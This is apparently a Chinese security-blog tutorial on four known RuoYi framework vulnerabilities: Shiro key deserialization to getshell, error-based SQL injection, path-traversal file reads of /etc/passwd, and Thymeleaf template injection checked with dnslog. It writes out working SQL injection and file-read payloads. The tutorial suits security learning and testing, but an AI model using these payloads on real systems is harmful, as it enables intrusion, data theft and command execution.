---
title: 每日一学：若依（Ruoyi）框架，你必须知道的四个通用漏洞
url: https://mp.weixin.qq.com/s/azoyt805nHgrJXyV0qKY7g
source: Doonsec's feed
date: 2026-09-10
fetch_date: 2026-09-11T06:48:16.941236
---

# 每日一学：若依（Ruoyi）框架，你必须知道的四个通用漏洞

# 每日一学：若依（Ruoyi）框架，你必须知道的四个通用漏洞

原创

森林之家zbs
森林之家zbs

allby森林之家

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

## 若依（​Ruoyi）框架管理系统是什么？

若依（Ruoyi）管理系统，是一款基于Java开发的开源后台管理系统。

若依系统登录界面案例：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBcwYnQfJeN9Qyibvic1udicicsV4D1xQiaAZ2PDSC8e8GUFAWWOt0OwicnXJicd95PxZN4C8s5HrTHz6lEtR9rtx2buLn8bicRr7icjfdJI/640?wx_fmt=png&from=appmsg)

ruoyi后台的界面一般长这样子：

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBeLFibjHb71HZeIHakrqouCFb6M7jS2icn1Bso7LU0vC20bjhG2jlvJWCCjHXMOZWicub9kxu4OIwFEia93G1ENGL4GYKNed5FQYH0/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBcMRKbzZ6uS9nvpAlBYR47AmMQuGVpCMxRLicnI0zd0T5WricUEIIicUpkAbQNX36ucX7LsnhcEdCxAgTmS21lQ29ESYnBzawPUII/640?wx_fmt=png&from=appmsg)

若依管理系统采用前后端分离架构，前端使用Vue.js框架，后端使用Spring Boot框架。

ruoyi前端框架vue.js可以用插件查看：

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBdfO2HFUxaQylAVArcseicrgibF37tKaibpicWgwBzFPsOicSPfkltVJcelmbR5oIHk6jI0lK8kWIzib4ISev7qQR706SOJXv4Va8eN4/640?wx_fmt=png&from=appmsg)

shiro框架有个很明显的特征：

可以通过登录失败时bp抓包观察响应包是否有remeberMe=delete，如果有一般都是shiro登录框架。

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBcbOe4RkV0ibVnba19KNiaSLbAicStwfb2K3a2dKWlCk11dUdZJwHmQp8A0URcsEofzvncnwkGsCrzHKoiaWjOicJKHF9zausRCniaics/640?wx_fmt=png&from=appmsg)

##

## ruoyi漏洞一：前台默认shiro key命令执行漏洞

若依默认使用shiro组件，所以可以试试shiro经典的反序列化 rememberMe漏洞：
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBcIqoSZZFa5CpJlojqw5AQsib3WWlWhBcNIGpUFN8VVoCxtKorlHP8JTV3TGM28fu4jCmBNycamW0MkRmZTH5cicvqMc7ibSgDRNQ/640?wx_fmt=png&from=appmsg)
url和cookie配置好后，直接开始爆破key
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBedtsv2fHFSOjjJwhl3G9H9jnRbuWYc5FQOzDCp2skPGiaHRXibBBUqJLdlUK869vpXiaAC3RxShFpNOTv7JWn1YhtLnosSszqUmY/640?wx_fmt=png&from=appmsg)
这里拿到了AES key，还发现了很多其他的漏洞，我们暂且不提，先针对shiro框架进行Attack：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBcV0ZXsav2Vkgic4VjAKjMAg1bZnENJiaOpXoKTRtVM2Uhg4BkWWT6m4mMff7xLX9j9QPodMRhLsB17zLs81ccVqR7v2uLZgPHu0/640?wx_fmt=png&from=appmsg)
有了key，可以直接通过相关工具检测利用链，检测成功后就可以命令执行getshell了：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBdXyc2C76icGmwyMtBtSP6icnyH4Fbe4ztLjDUAxx6f8Z5vBhzZ41yicWib44gCzA78U94u29PSribiaib6CdDLpTmvPwQkLxlALy7of8/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBdoLXF55Lg6dHB0qvuOcfGkYuX05yKp1nxiciaTXpPnSr2nEEX78DDTv8qpMg34V9aVUs9DVO3n0u5BibKolSHsY6vnZbDtaZDKSo/640?wx_fmt=png&from=appmsg)

## 漏洞二：若依后台​框架存在多处sql注入

#### 第一处：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBeZ2sk6g43uz4SibJA9kYZabq14UYf1xDrheKWmpZczYKetNmalAJmF0icbdYFFJeBHTw8oIcY3J7BIEvySpXic1Q5UZje6SRY2Ic/640?wx_fmt=png&from=appmsg)
角色管理的搜索，bp拦截抓包：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBciaZSqaSpKRVraDYOzkPGhAfyCguXicIiaG0gxRpiaxo5Bya5h3oKzUBHEibE1WsOCHgobNxaru0rxodDicSBPSNSJEbGoefxNMfpws/640?wx_fmt=png&from=appmsg)
and extractvalue(1,concat(0x7e,(select database()),0x7e))，报错注入回显database（）：

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBfanHia18gpW0Rvia9ZmqL8RnqpIN624ECPGMbqbHOtfhRib4pUDia5xGJcAorziaSl0Tl0z0o3KaILiaRmVnM0lK7uV4pyicRqnn71Sc/640?wx_fmt=png&from=appmsg)
and extractvalue(1,concat(0x7e,(select table\_schema from information\_schema.tables limit 0,1),0x7e))
![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBdF5JNtUILsmzFmdbgOGibm7ice2l4SibFRunicc6MWxNFaviaNDQohic9tZcxyqdTXBsqNBCrDLHc9BhhnSMF4KsFQ4W88guClSCxhE/640?wx_fmt=png&from=appmsg)
爆到库名，点到为止！

#### 第二处：

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBc5qSqgYmSEJoJ2mKPcNvGAxud8AJedMykx6RwxQKDJYfza0iaXNdssn6dGrhZVibLajlicWc8d40Lib4PapicE5PtQEibImJNSA5qtw/640?wx_fmt=png&from=appmsg)
角色管理导出这里

and extractvalue(1,concat(0x7e,(select database()),0x7e))

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBd53ZKKR6t8z48xRs9eJicGDxODVpZXiaNyS67yr30XCKCicibB6z4KEZKx6IgnmQLWUD1pFEasXx7YBwg4l0s8kK3fOlPicSErRgs0/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBfHtKQwanicNGnTnWrFpic8VNXDGuGezYmicAicuibEdiaIDHDunHejhVVwOOceTPbvKuBlczz7hMPQk0oibNE8Lcm47dwc0PCsIKAqVs/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBcib8KnZz6TVXcHVUMjgZJQn749UibRSx3P9t2PXicNMmS2ZwRvic2MyUYdf5vHngOhAApElFNRry4Dg87ZkTs4l1JkAGLvOE0UKxc/640?wx_fmt=png&from=appmsg)

#### 或者直接使用工具：

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBdickyfO8g3P8KiaXnqdXrhseiabtoiaUZgHgAcFDMQyaSfAGA5QcKJI8Uibc3Kqib1I1mc6AdJbRAetJ56jt5XDHQL4INDEzHNj5G1w/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBeGVYXic5KjJiaMY8DHZguAyotKh06cHIibH4NbPYpUaliblc63IicMMvmrZO6CY02KDy6j1WLH0MLvZicQ68skDWicMTCicAnfcFmMJbE/640?wx_fmt=png&from=appmsg)

## 漏洞三：若依后台任意文件读取

Poc1复现方式：可直接访问网址接目录后缀：
/common/download/resource?resource=/profile/../../../../etc/passwd
/common/download/resource?resource=/profile/../../../../Windows/win.ini

成功下载读取后台文件passwd，即可证明漏洞存在；

Poc2复现方式：访问http://<host>/demo/mail/sendmessagewithattachment?to=test@test.com&subject=test&text=test&filepath=/etc/passwd。通过查看邮件附件即可获取文件内容

Poc3复现方式：通过POST请求修改定时任务参数，将invokeTarget设置为ruoyiconfig.setprofile('/etc/passwd')并执行任务，随后通过文件下载接口获取读取结果。

## 漏洞四：Thymeleaf模板注入

Thymeleaf模板注入（SSTI）结合DNS与Ping的利用，确认目标服务器是否出网，进行无回显的命令执行验证。

通过构造恶意SpEL表达式，让目标服务器执行ping命令，并请求攻击者控制的DNS日志域名，通过DNS请求记录来确认命令是否执行成功。

可以用ping+dnslog进行组合Attack：

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBda5AQtU8ABAYdU06waN1FwO06qqaqflcLuiaNoUdlLkEXDtIiaQ4vQt9IYMnHYqo9OsNvibKmoFKhyQS2iaxkakOnB9EibIz8a6WpI/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBc8pG8EBEhx6z0iadCRZvFN5WhPoLpziaD2ed5dicRwVKeMFibWgqs2sGQk5Z4dh1E4gYHL5AAYLrFHA2JUpnwmkLEVf5O8BnxuEWs/640?wx_fmt=png&from=appmsg)

## 若目标服务器存在漏洞，会向DNS日志域名发起DNS解析请求。

##

## 【8月网安之家其他​文章快通车】：

## [每日一学：struts2框架，你必须知道的几个通用漏洞](https://mp.weixin.qq.com/s?__biz=Mzg3NjY2NTYzOQ==&mid=2247484456&idx=1&sn=0ade9ec80ceca9e185191d71c6c4cafa&scene=21#wechat_redirect)

## [shiro框架，你必须知道的三个通用漏洞](https://mp.weixin.qq.com/s?__biz=Mzg3NjY2NTYzOQ==&mid=2247484109&idx=1&sn=66304cb00291fd6409eaa54b0f9c362a&scene=21#wechat_redirect)

## [CTF 新手必学：SQL 注入（附8月份网安学习文章汇总）](https://mp.weixin.qq.com/s?__biz=Mzg3NjY2NTYzOQ==&mid=2247485044&idx=1&sn=1af0b366749b934494c50aead71beb0f&scene=21#wechat_redirect)

## [Agent渗透测试技能一图流:10个渗透skills](https://mp.weixin.qq.com/s?__biz=Mzg3NjY2NTYzOQ==&mid=2247485058&idx=1&sn=1b05e139a985184215c75e2b0814276a&scene=21#wechat_redirect)

## [每日学习：如何破解Mysql数据库密码](https://mp.weixin.qq.com/s?__biz=Mzg3NjY2NTYzOQ==&mid=2247485022&idx=1&sn=89a46d5d7c4b144ffaa5d09bc3051d49&scene=21#wechat_redirect)

## [每日学习：文件上传漏洞的十个小场景【靶场】](https://mp.weixin.qq.com/s?__biz=Mzg3NjY2NTYzOQ==&mid=2247484552&idx=1&sn=8313524476525affffaeec06b7e3b3e1&scene=21#wechat_redirect)

## [每日一学：如何对App进行渗透测试？](https://mp.weixin.qq.com/s?__biz=Mzg3NjY2NTYzOQ==&mid=2247484483&idx=1&sn=3338136588f8a5f546e1351a2d07b4a1&scene=21#wechat_redirect)

##

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ZEY5a7YmV0vemdjA6fvqqblGxKWCcN4CTJCB2ujDEQP5r90enPicrtUGtNvOQIl2a61SGXtT8OcClCWGfhwv5DQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过